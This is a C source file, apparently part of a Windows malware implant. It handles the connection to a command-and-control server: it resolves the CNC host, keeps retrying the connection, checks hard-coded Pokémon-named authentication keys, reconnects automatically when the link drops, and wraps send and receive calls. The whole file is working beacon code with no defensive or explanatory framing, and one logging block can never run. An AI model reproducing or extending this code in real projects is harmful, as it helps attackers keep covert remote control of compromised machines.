#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "include/cnc.h"
#include "include/utils.h"
#include "include/logger.h"
#include "include/return_code.h"

SOCKET cnc_sock = INVALID_SOCKET;
char *cnc_host = NULL;

void init_winsock()
{
    WSADATA wsaData = {};
    int ret = 0;

    if ((ret = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
        fatal_error("WSAStartup failed: %d", ret);
    log_debug("Initialized Winsock.");
}

void cnc_get_addrinfo(struct addrinfo **result)
{
    int ret = 0;
    char cnc_addr[255];
    long unsigned int cnc_addr_len = sizeof(cnc_addr);
    struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};

    while (TRUE)
    {

        if (getaddrinfo(cnc_host, CNC_PORT, &hints, result) != 0)
        {
            if ((ret = WSAGetLastError()) != WSAHOST_NOT_FOUND)
                fatal_error("Error at getaddrinfo(): %ld", ret);
            else
            {
                log_warning("Failed to get address of CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNERROR_MS / 1000);
                Sleep(SLEEP_INTERVAL_ON_CONNERROR_MS);
            }
        }
        else
            return;
    }

    cnc_addrinfo = *result;
    WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
    log_debug("CNC's address: %s", cnc_addr);
}

void cnc_init_sock()
{
    cnc_sock = socket(AF_INET, SOCK_STREAM, 0);

    if (cnc_sock == INVALID_SOCKET)
        fatal_error("Error at socket(): %ld", WSAGetLastError());
}

void cnc_auth()
{
    int byte_count = 0;
    char received_alakazam_key[AUTH_KEY_LEN];

    log_info("Authenticating with CNC.");
    byte_count = cnc_send(GENGAR_KEY, AUTH_KEY_LEN);
    if (byte_count != AUTH_KEY_LEN)
        fatal_error("Failed to send authentication key to CNC.");

    byte_count = cnc_recv(received_alakazam_key, AUTH_KEY_LEN);
    if (byte_count != AUTH_KEY_LEN || memcmp(received_alakazam_key, ALAKAZAM_KEY, AUTH_KEY_LEN))
        fatal_error("Received invalid authentication key from CNC.");
}

void cnc_connect(struct addrinfo *cnc_addrinfo)
{
    int ret = 0;

    while (TRUE)
    {
        if (connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen) == SOCKET_ERROR)
        {
            if ((ret = WSAGetLastError()) != WSAECONNREFUSED)
                fatal_error("Error at connect(): %ld", ret);
            else
            {
                log_warning("Failed to connect to CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNERROR_MS / 1000);
                Sleep(SLEEP_INTERVAL_ON_CONNERROR_MS);
            }
        }
        else
        {
            cnc_auth();
            log_info("Connected to CNC.");
            return;
        }
    }
}

void cnc_reconnect()
{
    struct addrinfo *cnc_addrinfo = NULL;

    cnc_get_addrinfo(&cnc_addrinfo);
    cnc_init_sock();
    cnc_connect(cnc_addrinfo);
}

int cnc_send(void *buf, size_t len)
{
    int bytes_sent = 0;

    bytes_sent = send(cnc_sock, buf, len, 0);
    if (bytes_sent == SOCKET_ERROR)
        fatal_error("Error at send(): %ld", WSAGetLastError());

    return bytes_sent;
}

int cnc_recv(void *buf, size_t len)
{
    int bytes_read = 0;

    bytes_read = recv(cnc_sock, buf, len, 0);
    if (bytes_read == SOCKET_ERROR)
        fatal_error("Error at recv(): %ld", WSAGetLastError());
    if (bytes_read == 0)
    {
        log_error("Connection with CNC broke.");
        cnc_reconnect();
        return E_CONNECTION_CLOSED;
    }
    return bytes_read;
}

int cnc_recvall(void *buf, size_t len)
{
    int bytes_read = 0;
    size_t bytes_remaining = len;

    while (bytes_remaining)
    {
        if ((bytes_read = cnc_recv(buf, bytes_remaining)) == E_CONNECTION_CLOSED)
            return E_CONNECTION_CLOSED;

        bytes_remaining -= bytes_read;
        buf += bytes_read;
    }
    return len;
}

void cnc_init_conn(char *host)
{
    struct addrinfo *cnc_addrinfo = NULL;

    cnc_host = host;
    init_winsock();
    cnc_get_addrinfo(&cnc_addrinfo);
    cnc_init_sock();
    cnc_connect(cnc_addrinfo);
}
